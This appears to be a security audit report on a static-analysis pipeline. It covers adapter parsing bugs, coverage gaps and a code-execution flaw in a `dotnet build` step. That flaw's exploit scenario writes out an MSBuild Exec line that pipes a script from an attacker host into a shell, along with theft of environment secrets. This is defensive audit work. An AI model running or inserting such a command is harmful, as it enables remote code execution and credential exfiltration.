findings.description: `cve = vuln.get("name", "")` followed by `cve.startswith("CVE-")` (line 89) assumes `vuln["name"]` is never explicitly `null`; `dict.get(key, default)` only substitutes the default when the key is *absent*, not when its value is `None`. If a dependency-check entry ever has `"name": null`, this raises `AttributeError: 'NoneType' object has no attribute 'startswith'`. The same unguarded pattern (`.get(key, []).startswith`/iterating a possibly-`None` list) recurs in `cargo_audit.py` (`advisory.get("id", "").startswith("RUSTSEC-")`, line 74), `npm_audit.py` (`adv.get("cves", [])`, `via.get("cves", [])`, lines 27 and 60) and `pip_audit.py` (`vuln.get("aliases", [])`, line 55) — in contrast, `osv_scanner.py` consistently uses the defensive `raw_value or []`/`or ""` idiom for the same kind of field. Because `scripts/ingest_tools.py::ingest_dir()` wraps each adapter's `parse()` call in a blanket `try/except Exception` that skips the whole file on any error, a single malformed/null field anywhere in one tool's report silently discards every finding from that tool run, not just the offending entry.
findings.impact: A single unexpected `null` in an otherwise-valid scanner report causes total, silent loss of that tool's findings for the run (reduced detection coverage with no error surfaced beyond a one-line stderr note in `ingest_dir`).
findings.remediation: Use `raw_dict.get(key) or default` (or explicit `is None` checks) consistently, matching the defensive pattern already used in `osv_scanner.py`, so a single malformed field degrades one finding rather than the whole tool's output.

findings.title: sarif_to_findings() can emit findings with an empty `location` object when a SARIF result has no `locations`
findings.description: `loc = {}` is the fallback whenever `res.get("locations")` is empty, so the resulting finding's `location` carries neither `file` nor `line_start`. `scripts/synthesize.py::validate_report()` (around line 739) already detects this (`"missing location.file/line_start"`) but only records it as a non-blocking warning, so unlocated tool findings pass all the way through.
findings.impact: Reduced traceability for a subset of tool findings (e.g. semgrep/gosec/trivy results with only a project-level or no physical location); downstream dedupe/clustering in synthesize.py keys on `(file, line)`, so these findings can never be correlated with a matching agent-sourced finding and always look 'new' in delta reports.
findings.remediation: Fall back to a non-empty sentinel `file` (e.g. the tool/manifest name, mirroring what the dependency adapters already do with `"file": "Gemfile.lock"`/`"Cargo.lock"`) instead of an empty dict when a SARIF result has no physical location.

provenance.confirmation_reasoning: The cited code is exactly as described. In /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/sarif_utils.py, `sarif_to_findings()` initializes `loc = {}` (line 75) and only populates it inside `if locs:` (lines 77-80). `loc` is then assigned verbatim to the finding's `"location"` key (line 107), so any SARIF result whose `locations` array is absent or empty yields a finding with `location == {}` — no `file`, no `line_start`. The `if locs:` guard shows the author explicitly anticipated this case, so the path is reachable for any tool that emits a result without a physicalLocation. Downstream corroboration of the claim: (1) /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/synthesize.py line 739-740 detects the condition but only appends to `warnings`, never `errors`, so it is non-blocking as claimed; (2) `dedupe`'s clustering (synthesize.py lines 245-251) sends any finding without a file or integer line to `passthrough`, and `cross_panel_corroboration` (lines 348-353) skips it entirely, so such findings can indeed never be reinforced or corroborated against an agent finding; (3) /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/reference/report-schema.json lines 82-91 declares `location` with `required: ["file", "line_start"]`, so an emitted `location: {}` is schema-invalid (schema validation is only exercised in tests, not at runtime); (4) the suggested sentinel pattern really does exist in the dependency adapters — skill/scripts/tools/bundler_audit.py line 45 (`"file": "Gemfile.lock", "line_start": 1`) and skill/scripts/tools/cargo_audit.py line 85 (`"Cargo.lock"`). One part of the stated impact is inaccurate and should not be relied on: the delta/compare path in /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/html_report.py uses `_fingerprint()` (lines 246-257), which deliberately ignores line numbers and hashes panel|category|file|title|description; an unlocated finding simply hashes with an empty file component and still matches its counterpart across runs, so it does NOT 'always look new'. The core defect (empty `location` object emitted, traceability and dedupe/corroboration loss) is confirmed; the delta-report consequence is not. Also note normalize_finding (synthesize.py lines 64-68) leaves the empty dict in place, only adding `line_end: None`/`function: None`, so nothing repairs it later. Severity LOW is appropriate.

findings.title: cargo-audit adapter's non-standard `rustsec` citation key is dropped by the downstream citation pipeline, zeroing citation quality for CVE-less advisories
findings.description: `citations = {"rustsec": [advisory_id]} if advisory_id.startswith("RUSTSEC-") else {}` seeds a `rustsec` key that `scripts/citations.py::enrich_citations()` does not recognize (it only reads `cwe`/`owasp`/`cve`/`epss`/`ssvc` from the raw dict). For RustSec advisories with no CVE alias and no CWE mapping — common, since many RUSTSEC IDs never get a CVE assigned — `enrich_citations` builds an empty `clean` citations dict, removes `citations` from the finding entirely, and sets `citation_quality: "none"`, even though the finding is a CERTAIN, tool-confirmed dependency vulnerability with a valid public advisory ID.
findings.impact: High-confidence dependency-vulnerability findings from cargo-audit lose all citation credit purely due to an unrecognized citation key, which can suppress or deprioritize them under any citation-quality-gated triage/reporting built on top of `citation_quality`.
findings.remediation: Either drop the non-standard `citations["rustsec"]` key (the advisory ID is already preserved in `tool_evidence.rule_id`, so nothing is lost) so `citation_quality` correctly reflects the absence of CWE/CVE data, or extend `scripts/citations.py::enrich_citations` to recognize and preserve a `rustsec` citation type.

provenance.confirmation_reasoning: The mechanism is exactly as described; I traced it end to end. In skill/scripts/tools/cargo_audit.py:74 the adapter emits `citations = {"rustsec": [advisory_id]} if advisory_id.startswith("RUSTSEC-") else {}`, adding `citations["cve"]` only when `advisory.aliases` contains a CVE (line 73/75-76). In skill/scripts/citations.py::enrich_citations (lines 219-269) the raw citations dict is never copied through — a fresh `clean = {}` is built and only five keys are ever read: `cwe` (via _raw_cwe_ids, line 232), `owasp` (line 238), `ssvc` (line 243), `cve` (line 249), `epss` (line 259). `rustsec` is read nowhere; I grepped the whole repo and the key appears only at cargo_audit.py:74 and in a string-containment assertion in tests/tools/test_rust_integration.py:32. For a CVE-less RUSTSEC advisory the trace is: _raw_cwe_ids -> [] (no `cwe` key), owasp -> [], ssvc_decide(None,None,None) -> None, cve -> [], then the category fallback at line 255 calls _derive_cwe_from_category('dependency_vulnerability'), and CATEGORY_CWE_OVERRIDES (citations.py:16-29) has no such key, so it returns None. `clean` stays empty, so line 261 computes _compute_citation_quality({}, f.get('cvss')); the cargo-audit finding never sets a top-level `cvss` field (it only reads advisory.cvss to pick a severity, lines 62-71), so the guard at citations.py:185-186 returns 'none', and line 265 pops `citations` off the finding entirely. Nothing upstream repairs this: synthesize.normalize_finding (synthesize.py:47-85) does not touch citations, and skill/scripts/ingest_tools.py has zero references to citations/cwe/cvss — it just routes raw bytes to adapter.parse. enrich_citations is the only enrichment, called at synthesize.py:942 and again at :638. Two corrections to the claim's framing, both material for triage. (a) The impact is currently cosmetic, not gating: build_report pops `citation_quality` off the finding (synthesize.py:642) and evidence.derive_evidence (evidence.py:34-71) only copies it into `evidence.citation_quality`; tool-sourced findings unconditionally return status 'tool_confirmed' (evidence.py:44-49), which is in GATE_ELIGIBLE_DEFAULT, so no cargo-audit finding is suppressed or deprioritized today. The only consumer is a display badge in html_report.py:325-327/496-497. The claim's 'can suppress ... under any citation-quality-gated triage' is hypothetical — no such gate exists in this repo. (b) The delta is one notch: if `rustsec` were preserved in `clean`, _compute_citation_quality would fall through to the `or citations` arm at citations.py:200 and return 'minimal' instead of 'none'. So 'zeroing citation quality' is accurate, but the recoverable value is 'minimal', not 'partial'/'full'. One caveat on the proposed remediation: simply dropping the `rustsec` key would break tests/tools/test_rust_integration.py:31-34, which asserts `any("RUSTSEC-" in str(f.get("citations")) for f in findings)` on adapter output; that test would need to move its assertion to tool_evidence.rule_id. Note also that the report schema (skill/reference/report-schema.json:135-144) enumerates only cwe/owasp/ssvc/cve/epss under citations, so `rustsec` is non-standard there too — which argues for the drop-the-key option plus a test fix, or for adding `rustsec` to both citations.py and the schema.

findings.title: Unused `ID_RE` in base.py duplicates and diverges from the canonical finding-ID regex in synthesize.py
findings.description: `base.py` defines `ID_RE = re.compile(r"^[A-Z]{2,4}-\d{3,}$")` but it is not imported or used anywhere else in the codebase — every adapter module imports only `attach_tool_provenance`/`normalize_severity`/`new_finding_id`/`omit_none`/`run_tool` from `base.py`. The actually-enforced pattern lives in `scripts/synthesize.py` (`ID_RE = re.compile(r"^[A-Z]{2,8}-\d{3,}$")`, deliberately widened to 8 chars, per its own comment, for prefixes like `STRUCT-001`), which is also what this task's finding-format contract documents (`^[A-Z]{2,8}-\d{3,}$`). The dead copy in base.py only allows up to a 4-character prefix.
findings.impact: No runtime effect today since the constant is dead code, but it is a latent trap: base.py is the natural place a future contributor would look for (or add) adapter-ID validation, since every adapter already imports from it. Wiring validation to this narrower, out-of-sync regex would silently reject any adapter prefix longer than 4 characters even though the canonical schema (and synthesize.py's actual gate) permits up to 8.
findings.remediation: Delete the unused `ID_RE` from base.py, or replace it with an import of the canonical pattern from `scripts/synthesize.py` (or a shared constants module) so there is a single source of truth for the finding-ID format.

provenance.confirmation_reasoning: Every factual component of this claim checks out. (1) The constant exists as cited: base.py:38 is `ID_RE = re.compile(r"^[A-Z]{2,4}-\d{3,}$")`. (2) It is dead. A repo-wide grep for `ID_RE` returns only three live-code hits: base.py:38 (the definition), skill/scripts/synthesize.py:454 (definition) and :723 (the only enforcement site, `if not ID_RE.match(f.get("id", "")):`), plus tests/test_synthesize.py:1437/1439/1537 which exercise `syn.ID_RE`, never `base.ID_RE`. I confirmed the import surface independently: all ten adapter modules (cargo_audit, npm_audit, osv_scanner, brakeman, spotbugs, pip_audit, dependency_check, bundler_audit, eslint_security, roslyn_secguard) import only from `attach_tool_provenance, normalize_severity, new_finding_id, omit_none, run_tool`, and legacy_sarif.py imports only `run_tool`. tests/tools/test_base.py imports the module as `base` but asserts only on normalize_severity, new_finding_id, omit_none, attach_tool_provenance, and run_tool — nothing touches ID_RE. `re` is imported at base.py:4 solely to build this dead constant. (3) The divergence is real and deliberate on the other side: synthesize.py:454 carries the self-documenting comment `# {2,8}: real agents emit e.g. STRUCT-001`, and docs/superpowers/2026-08-03-calibration-fixmes.md:88 records this as 'F-CAL-4: `ID_RE` rejects real agent ids — `^[A-Z]{2,4}-\d{3,}$` vs ...', i.e. base.py:38 is a leftover copy of the pre-fix pattern that was widened in synthesize.py but never updated or removed here. The original narrow form is also preserved in docs/superpowers/plans/2026-08-01-static-analysis-phase1.md:144. (4) The contract claim holds: `^[A-Z]{2,8}-\d{3,}$` is what the rendered agent prompts document (tests/goldens/lens-sweep.rendered.txt:20, tests/goldens/panel-review.rendered.txt:26). The 'latent trap' impact is correctly framed as having no runtime effect today — I checked every adapter `prefix` (CA, NA, RS, OS, BK, SB, ESS, DC, BA, PA) and all are 2-3 characters, so nothing currently exceeds the stale 4-char bound. Severity LOW and the confidence label POSSIBLE are both appropriately conservative; the underlying facts are certain. Either remediation (delete, or import the canonical pattern) is sound; note that deleting ID_RE also makes the `import re` at base.py:4 dead.

findings.title: Silent Selection of First Alphabetically Sorted Requirements File
findings.description: PipAuditAdapter._find_requirement() silently returns the first alphabetically sorted match from glob.glob(). In projects with multiple requirements files (e.g., requirements-dev.txt, requirements-prod.txt, requirements.txt), the selection is deterministic but may not reflect the intended primary manifest, causing incomplete or incorrect vulnerability audits.
findings.impact: Critical dependencies in non-alphabetically-first manifests could be missed, and development/test dependencies might be audited instead of production dependencies.
findings.remediation: Prioritize known manifest names (e.g., requirements.txt, then requirements-prod.txt, then others) or require explicit configuration of which manifest to audit.

provenance.confirmation_reasoning: skill/scripts/tools/pip_audit.py:44-47 reads `for path in sorted(glob.glob(os.path.join(target, "requirements*.txt"))): return path` — a loop that returns on the first iteration, i.e. the alphabetically first match, with no preference for requirements.txt and no diagnostic. The selection then becomes the sole audited manifest: invoke() (lines 31-42) appends exactly one `--requirement <req>` and, when a requirements file is found, never passes the project directory, so no other manifest is scanned. The ordering hazard is concrete, not theoretical: within the common prefix 'requirements', '-' (0x2D) sorts before '.' (0x2E), so 'requirements-dev.txt' precedes 'requirements.txt', and 'requirements-dev.txt' precedes 'requirements-prod.txt'. In a repo containing all three, pip-audit is run against the dev manifest only and production dependencies are never audited — exactly the impact the claim states. The adapter is nonetheless reported as having run, and parse() labels findings with self._manifest_path (line 64), so downstream output looks like successful Python dependency coverage. Nothing elsewhere compensates: is_applicable() (lines 16-25) only tests existence, and there is no configuration key for manifest selection anywhere in the repo (grepped _find_requirement / requirements* across the tree; only this file, the original design plan, and the docs mention it). The tests confirm the shape rather than guard against it — tests/tools/test_pip_audit.py:107-119 mocks glob to return a single path, so multi-manifest ordering is untested. Two accuracy notes for the auditor: this is a coverage/correctness gap rather than a vulnerability, LOW is the right severity, and the CWE-1025 mapping is a poor fit (CWE-1076/incomplete-analysis framing would be more honest) — but the described behavior itself is real.

findings.title: roslyn-secguard adapter executes untrusted target source via `dotnet build`, violating the tool ecosystem's stated no-code-execution invariant
findings.description: `RoslynSecGuardAdapter.invoke()` stages a copy of the scanned repository and runs `["dotnet", "build", tmp_target, "-p:TreatWarningsAsErrors=false", "-p:ErrorLog=" + sarif + ",version=2.1"]` with no `--no-restore`, no `-p:Configuration=`/analyzer-only mode, and no execution sandboxing beyond the enclosing container. `dotnet build` is a full MSBuild invocation: it performs an implicit NuGet restore (which can pull packages from any feed named in a repo-supplied `nuget.config`/`NuGet.Config`) and evaluates arbitrary MSBuild XML, including `<Target Name="BeforeBuild"/"AfterBuild">` hooks with `<Exec Command="...">` tasks and inline C# tasks declared via `<UsingTask TaskFactory="RoslynCodeTaskFactory">`, all of which execute with the privileges of the scanning process during the build. This directly contradicts the project's own documented trust model: `skill/scripts/run_tools.py` (lines 3-4) states "Network is allowed (tools only parse source, never execute it)" and the phase-1/2 design doc (`docs/superpowers/specs/2026-08-01-scanner-ecosystem-expansion-design.md:16`) states "Read-only reviews: scanners parse source and lockfiles; they do not execute untrusted code." Every other adapter in this file set (brakeman, bundler-audit, spotbugs against pre-built classes, dependency-check, cargo-audit, pip/npm/osv-audit) is a pure static/metadata scan; roslyn-secguard is the sole adapter that compiles/executes the scanned repository, and it is dispatched automatically whenever a `.csproj`/`.sln` is present with no opt-in or additional isolation. `skill/scripts/run_tools.py` also mounts the checked-out target read-only and, when `NVD_API_KEY` happens to be set in the orchestrator's environment, injects it into every adapter's container (`run_tools.py:157-158`) regardless of which tool is running — so a malicious build triggered by this adapter can potentially read and exfiltrate that credential over the network the adapter is explicitly allowed to use.
findings.impact: A repository (or PR) submitted for panopticon scanning that contains a crafted `.csproj`, `Directory.Build.targets`, or `nuget.config` achieves arbitrary code execution inside the scanning worker/container the moment roslyn-secguard runs. This breaks the core security guarantee of a static-analysis pipeline (that scanning untrusted code is itself safe) and can be used to exfiltrate any secrets/credentials reachable from that process (e.g. `NVD_API_KEY`, cloud metadata, other mounted volumes), pivot further into the scanning infrastructure, or produce falsified/suppressed findings by tampering with the scan process itself before results are synthesized.
findings.remediation: Never invoke a full build/toolchain execution step against untrusted source as part of security scanning. Options, in order of preference: (1) replace the build step with a non-executing Roslyn/SecurityCodeScan invocation that only parses syntax trees (e.g. via the Roslyn analyzer API without MSBuild evaluation, or `dotnet format analyzers --verify-no-changes` style read-only analysis); (2) if a build is unavoidable, run it with `--no-restore` against a pre-vendored/offline NuGet cache, strip the environment to an explicit allow-list (do not inherit host secrets), disable network egress for the build container, run as a non-root, resource-capped, ephemeral sandbox with no volume access beyond the copied source, and explicitly neutralize custom MSBuild targets/inline tasks (e.g. `-p:CustomBeforeMicrosoftCommonTargets= -p:CustomAfterMicrosoftCommonTargets= -restore:false`); (3) gate this adapter behind an explicit, documented "executes target code" opt-in separate from the other read-only adapters so operators can make an informed trust decision.
references: skill/scripts/tools/roslyn_secguard.py:49-72 (dotnet build on a copy of the scanned repo)
skill/scripts/run_tools.py:3-4 and DEVELOPMENT.md:55-56 (documented no-execution invariant used to justify allowing network)
skill/scripts/run_tools.py:26-29,156-158,199-203 (auto-selection + NVD_API_KEY passthrough to every adapter container)
Dockerfile:85-113 (.NET SDK, injected /Directory.Build.props, non-root scanner user)

cwe.name: Improper Control of Generation of Code ('Code Injection')

findings.exploit_scenario: An external contributor opens a pull request to a .NET repository that panopticon is configured to scan automatically. The PR adds a `Directory.Build.targets` file with a `BeforeBuild` target containing `<Exec Command="curl -s https://attacker.example/x | sh" />` (or an inline `RoslynCodeTaskFactory` task that reads environment variables and POSTs them out). When panopticon's roslyn-secguard adapter runs `dotnet build` on the copied checkout, the attacker's command executes with the scanning worker's privileges, network access, and any environment secrets present in that container (e.g. `NVD_API_KEY`), before the scan has even produced a single finding.

provenance.confirmation_reasoning:
Every code fact in the claim checks out.

(1) `RoslynSecGuardAdapter.invoke()` (skill/scripts/tools/roslyn_secguard.py:49-72) copies the scanned target with `shutil.copytree(target, tmp, dirs_exist_ok=True)` and then runs exactly `["dotnet", "build", tmp_target, "-p:TreatWarningsAsErrors=false", "-p:ErrorLog="+sarif+",version=2.1"]` via `run_tool(cmd, timeout=600)` -> `subprocess.run` (skill/scripts/tools/base.py:64-78). There is no `--no-restore`, no `-p:CustomBeforeMicrosoftCommonTargets=`/`CustomAfterMicrosoftCommonTargets=` neutralization, no environment stripping and no extra sandbox. `dotnet build` is a full MSBuild evaluation of repo-controlled XML: `Directory.Build.props/.targets`, `.csproj`/`.sln`, `<Target>` hooks with `<Exec>`, `<UsingTask TaskFactory="RoslynCodeTaskFactory">` inline tasks, and imported `.props/.targets` from restored NuGet packages (feeds configurable by a repo-supplied `nuget.config`). So attacker-controlled files in the scanned repo run commands with the scanner process's privileges. This is code execution driven by the target, not mere parsing.

(2) The stated invariant really is contradicted, in three places: skill/scripts/run_tools.py:3-4 ("Network is allowed (tools only parse source, never execute it)"), docs/superpowers/specs/2026-08-01-scanner-ecosystem-expansion-design.md:16 and .../plans/2026-08-01-scanner-ecosystem-expansion.md:16 ("scanners parse source and lockfiles; they do not execute untrusted code"). DEVELOPMENT.md:55-56 makes the dependency explicit and load-bearing: "**Scan-time network is allowed** (dropped `--network none`): SAST/SCA only parse code, never execute it..." — i.e. the no-execution assumption is the stated justification for allowing network egress in the scan container.

(3) "Sole adapter that builds the target" holds for the adapters I read: spotbugs.py:26-39 runs SpotBugs over pre-built `target/classes`/`build/classes`; dependency_check.py:18-42, cargo_audit.py:50-52 (`cargo audit`), npm_audit.py:16-18, brakeman.py:52-54, bundler_audit.py:27-29, pip_audit.py:27-42, osv_scanner.py:34-36, eslint_security.py:36-52 are all parse/metadata invocations. roslyn_secguard is the only `build`.

(4) Auto-dispatch with no opt-in: `roslyn-secguard` is in PHASE2_ADAPTERS (run_tools.py:26-29) and `__main__` selects it purely via `select_adapters()`/`is_applicable()` (run_tools.py:199-203); `is_applicable` returns True for any top-level `.csproj`/`.sln`. CI runs this unconditionally (.github/workflows/security.yml:48-51, `--target .` on the checked-out ref, including `pull_request`).

(5) NVD_API_KEY passthrough is real and untargeted: run_tools.py:156-158 adds `-e NVD_API_KEY` on the adapter-dispatch branch for *every* adapter. roslyn-secguard is not in `TOOL_CMD` (skill/scripts/tools/legacy_sarif.py:17-24), so it takes that branch and inherits the key even though only dependency-check uses it (dependency_check.py:25).

Corrections/calibration for the auditor, which do not change the verdict but do change the severity math: the execution happens inside the ephemeral `panopticon-tools` container, which runs as non-root `USER scanner` with the target mounted `-v <target>:/src:ro` (Dockerfile:103-113, run_tools.py:165-166), and the adapter builds a copy under `/tmp` rather than the read-only mount. So the immediate blast radius is RCE inside a throwaway non-root container with network access and whatever env it was given — not host RCE. The claim's CVSS 9.8 with `S:C`/`AV:N` is therefore inflated for the containerized path; the `run_adapters()` host-side helper (run_tools.py:94-112) would execute `dotnet build` directly on the host but is not reachable from `__main__` or any caller I found (only tests/test_run_tools.py:89-97). Also worth noting for remediation: a repo-supplied root `Directory.Build.props` shadows the image's `/Directory.Build.props` (Dockerfile:93-101) under MSBuild's nearest-ancestor discovery, so a hostile repo can both execute code and silently disable the SecurityCodeScan analyzer that is the adapter's entire purpose.

findings.title: Repo-controlled file names and messages flow into finding `title`/`location.file`/`description` without control-character sanitization (log/terminal injection)
findings.description: `dependency_check.py` builds `file_name = dep.get("fileName", "jar")` directly from the scanned artifact's file name and embeds it unsanitized into `title` (`f"{file_name}: {cve}"`) and `location.file`. File names inside a scanned repository/artifact are attacker-controlled and, on most filesystems, may contain newlines, carriage returns, and ANSI/terminal control sequences. The same pattern recurs across nearly every non-SARIF adapter in this group: `brakeman.py` (`w.get('file')`, `w.get('message')` — Brakeman messages often echo raw source snippets), `spotbugs.py` (`source.get("sourcepath")`), `roslyn_secguard.py` (`_message_text()` from compiler diagnostics, which can include source excerpts), and the package/version strings in `npm_audit.py`, `pip_audit.py`, `cargo_audit.py`, and `osv_scanner.py`. Notably, `skill/scripts/tools/sarif_utils.py` (lines 98-101) *already* implements a mitigation for exactly this class of issue — collapsing whitespace/control characters in the SARIF `title` field with an explicit comment citing "CWE-117 log injection" — but that mitigation (a) is not applied to `location.file` even within `sarif_utils.py` itself, and (b) is not applied at all by any of the direct JSON/XML-parsing adapters in this file set, so the risk the codebase already recognizes and partially fixes in one place is left open everywhere else.
findings.impact: A crafted dependency/artifact/file name (e.g. a jar embedded in the scanned repo, or a locally-vendored file) containing CR/LF or ANSI escape sequences propagates verbatim into synthesized findings. Depending on how downstream consumers render these findings (terminal output, log files, Markdown/HTML PR comments, dashboards), this can forge fake log lines, spoof terminal output, or inject formatting/markup into rendered reports — undermining the integrity of the security report itself.
findings.remediation: Apply the same normalization already used in `sarif_utils.sarif_to_findings()` (`" ".join(str(text).split())` or a stricter control-character strip) uniformly to every adapter's `title`, `description`, and `location.file` fields — ideally centralized as a shared helper in `base.py` (e.g. `sanitize_text()`) called by all adapters, including the SARIF path for `location.file`, rather than re-implemented ad hoc per adapter.

provenance.confirmation_reasoning:

No control-character normalization anywhere in the adapter. `fileName` is the path of an artifact inside the scanned repo, so it is repo-controlled; POSIX filenames may contain CR/LF and ESC.

findings.title: dependency-check silently runs against a possibly stale/absent vulnerability database with no signal in the emitted findings
findings.description: When `NVD_API_KEY` is unset, `DependencyCheckAdapter.invoke()` appends `--noupdate`, so the scan relies entirely on "a pre-seeded DB inside the image or on the host" (per the adapter's own comment). If that pre-seeded DB is missing, empty, or stale, `dependency-check.sh` can still exit 0/1 and emit a well-formed (but empty or incomplete) `dependency-check-report.json`. Nothing in `invoke()` or `parse()` records whether `--noupdate` was used or how current the underlying data source was, so a clean/empty result is indistinguishable in the emitted findings from "no vulnerable Java dependencies exist" versus "the vulnerability database was stale or absent."
findings.impact: For a component whose entire purpose is Java dependency-vulnerability detection, this creates a false sense of security: operators (and automated triage relying on `synthesize.py`) cannot tell a genuinely clean scan from a silently degraded one, risking missed known-vulnerable dependencies (CWE class most relevant to A06:2021 — Vulnerable and Outdated Components).
findings.remediation: Surface DB freshness/`--noupdate` state as adapter metadata (e.g. a low-severity INFO finding or a `tool_evidence` flag such as `db_stale: true`) whenever the NVD API key is absent, so downstream synthesis and report consumers can distinguish a degraded scan from a clean one, and consider failing the adapter loudly (rather than silently) when the seeded DB is missing entirely.

provenance.confirmation_reasoning:
Each in-repo element of the claim is verified, and one path the claim only asserted about external tool behavior turns out to be established by the repo's own code.

1) `skill/scripts/tools/dependency_check.py:25,33-34`: `has_nvd_key = bool(os.environ.get("NVD_API_KEY"))` and `if not has_nvd_key: cmd.append("--noupdate")`. The adapter's own comment (lines 22-24) states findings then depend on "a pre-seeded DB inside the image or on the host."

2) No such seeding exists in this repo. `Dockerfile:71-76` only downloads and unzips the dependency-check 10.0.3 release; there is no `--updateonly` / data-directory population step, and a repo-wide grep for `updateonly|odc|NVD` turns up nothing but `run_tools.py:157-158` (which merely forwards `NVD_API_KEY` into the container when it is set). So the default containerized configuration is exactly the degraded one.

3) The "no signal" core is verifiable from code alone and is stronger than the claim states. The adapter-to-pipeline channel carries only raw bytes plus a return code: `invoke()` returns `(bytes, rc)`; `_run_adapter.py:24,30,34` writes those bytes to stdout and returns rc; `run_tools.py:168-176` / `run_adapters()` at lines 102-111 persist stdout to `<tool>.json`; `ingest_tools.ingest_dir` (lines 55-92) hands only the bytes to `parse()`. `parse()` receives no invocation metadata, and neither does the report: `synthesize.build_report` meta (lines 677-686) carries target/review_type/timestamp/version/security_mode/models_used/tool_policy_mode — no scanner-coverage or DB-freshness field, and `summary` has no degradation channel either.

4) Decisive supporting detail the claim did not cite: `dependency_check.py:37-40` — if `dependency-check-report.json` is absent, `invoke()` returns `b"{}"` with the original rc. So a run that produced no report at all is converted into a syntactically valid, empty payload that parses to zero findings and is indistinguishable in the report from a genuinely clean scan. That establishes the "clean vs. silently degraded are indistinguishable" conclusion without needing to know dependency-check's exact exit code. And on the alternate branch (rc outside 0/1), `run_tools.py:171-173` skips the file with only a stderr line — again no in-report signal.

What I could not verify in-repo: the claim's specific assertion that `dependency-check.sh` "can still exit 0/1 and emit a well-formed but empty report" when the H2 DB is missing. That is external runtime behavior of DependencyCheck 10.x; settling it would need an actual container run or DC documentation. It does not change the verdict, because point 4 above produces the same silent-empty outcome through repo code regardless of which exit path DC takes.

This is a scan-coverage/observability gap rather than an exploitable defect; MEDIUM is defensible for a component whose sole purpose is Java SCA, and the OWASP A06:2021 mapping is apt.

findings.title: SpotBugs adapter silently no-ops (zero findings, exit 0) when compiled classes are absent
findings.description: `SpotBugsAdapter.invoke()` looks for `target/classes` then `build/classes`, and if neither exists it falls back to `classes = target` — the raw source tree. SpotBugs/FindSecBugs operate on JVM bytecode (`.class`/`.jar`), not `.java`/`.kt` source, so pointing it at an unbuilt source tree yields zero `BugInstance` results with no error surfaced by `invoke()`. `run_tools.py` treats any return code in `(0, 1)` as a successful scan and writes the (empty) output, so a project that was never compiled prior to scanning produces an indistinguishable "clean" `spotbugs.json` from a genuinely bug-free, fully-analyzed one.
findings.impact: False assurance: Java/Kotlin projects that are not pre-compiled as part of the CI/scan pipeline receive effectively zero SpotBugs/FindSecBugs coverage (including the security-relevant bug patterns in `_SPOTBUGS_CWE`, e.g. SQL injection, command injection, path traversal, weak TLS trust managers, hardcoded keys) while appearing to have been scanned successfully.
findings.remediation: When no compiled-classes directory is found, either skip the adapter with an explicit stderr/log message and no output file (rather than scanning the source tree as if it were bytecode), or emit an explicit INFO/degraded-coverage marker in the adapter's output so synthesis can flag "SpotBugs did not run against compiled bytecode" instead of silently reporting zero findings.

provenance.confirmation_reasoning: Every in-repo element of this claim checks out. (1) The fallback exists verbatim: /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/spotbugs.py:27-31 tries `target/classes`, then `build/classes`, then `classes = target`, and lines 34-38 pass that path to `spotbugs -textui -xml -pluginList <findsecbugs jar>` with no `-noClassOk` and no build step. (2) Nothing in the pipeline ever compiles the target: grep for `mvn|gradlew|dotnet build|compile` across skill/**/*.py returns hits only in unrelated regexes, and the only adapter that builds is roslyn_secguard.py:49-70 (`dotnet build` into a temp copy) — the contrast is deliberate and shows the Java path was left source-only. (3) Compilation cannot happen inside the container either: run_tools.py:164-166 mounts `%s:/src:ro`, and tests/test_run_tools.py:125-139 (`test_run_tools_uses_readonly_src_mount_for_phase2_build_adapters`) pins spotbugs to that read-only mount. (4) `is_applicable` (spotbugs.py:22-24) fires on the mere presence of pom.xml/build.gradle(.kts), i.e. regardless of build state. (5) The success path is as described: base.run_tool uses `ok_codes=(0, 1)` (base.py:64) and run_tools.py:171-176 / run_adapters:104-109 accept rc in (0,1) and write the output file; parse() returns [] for empty output (spotbugs.py:43-44). (6) There is no degraded-coverage signal anywhere downstream — build_report's meta (synthesize.py:677-686) records target/review_type/timestamp/version/security_mode/models_used/tool_policy_mode and no per-tool coverage, so an empty spotbugs.json is indistinguishable from a clean one and simply produces a green gate. (7) This is also a documented deviation from the design: docs/superpowers/specs/2026-08-01-scanner-ecosystem-expansion-design.md:81-82 specifies 'Fallback: if Maven wrapper or Gradle wrapper is present, run `mvn spotbugs:spotbugs` or `gradle spotbugsMain`' — the implementation replaced that fallback with 'scan the source tree'. Caveats for the auditor: the exact 'exit 0' assertion depends on SpotBugs' own behavior, which I cannot execute here — with zero class files and no `-noClassOk`, SpotBugs 4.x raises NoClassesFoundToAnalyzeException and may exit non-zero (1 is still inside ok_codes and therefore still silent; 2 would at least print 'adapter spotbugs exited 2; skipping' to stderr, still with no report-level marker). In the common case where the repo carries incidental bytecode (e.g. gradle/wrapper/gradle-wrapper.jar), SpotBugs exits 0 having analyzed only irrelevant artifacts, which matches the claim exactly. Adjacent observation that reinforces the same 'zero SpotBugs coverage' impact and deserves its own ticket: ingest_tools.py:72-77 truncates every ingested file to the first `{` or `[`, but spotbugs.json is XML — a JVM method signature such as `([Ljava/lang/String;)V` supplies a `[` at index > 0, so a *non-empty* SpotBugs report gets its XML prolog/root stripped, ET.fromstring raises ParseError, and the except at line 80 drops the whole file with only an 'ingest error' stderr line.

findings.title: spotbugs.py invoke() method lacks test coverage
findings.description: The invoke() method (lines 26-39) contains conditional logic to locate compiled classes directories but has no dedicated test. The method checks target/classes, then build/classes, then defaults to target (lines 27-31), plus SPOTBUGS_HOME environment resolution (line 32). No test verifies these fallback paths.
findings.impact: Directory resolution logic in spotbugs scanning is untested, risking incorrect tool invocation if expected directories do not exist.
findings.remediation: Add unit tests for invoke() method covering: (1) target/classes directory found, (2) build/classes fallback when target/classes missing, (3) target fallback when both missing, (4) SPOTBUGS_HOME default and override, (5) findsecbugs-plugin.jar path construction.

